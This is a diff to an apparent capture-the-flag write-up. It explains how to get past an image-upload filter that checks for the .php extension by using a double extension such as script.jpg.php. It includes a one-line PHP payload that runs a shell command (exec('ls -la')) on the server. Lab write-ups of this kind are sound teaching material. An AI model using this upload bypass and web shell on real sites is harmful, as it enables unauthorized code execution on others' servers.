@@ -14,7 +14,8 @@
 The website has an image upload but checks for the .php extension
 
 ### Solution
-1. Similar to [Superior File Manager](https://github.com/mynamegabe/May-CTF-Writeups/edit/main/Web/Superior-File-Manager), Upload a PHP script with a .png or .jpg extension
+1. Similar to [Superior File Manager](https://github.com/mynamegabe/May-CTF-Writeups/edit/main/Web/Superior-File-Manager),<br />
+   Upload a PHP script with a .png or .jpg extension anywhere in the file name. E.g. script.jpg.php
    ```php
    <?php echo exec("ls -la"); ?>
    ```
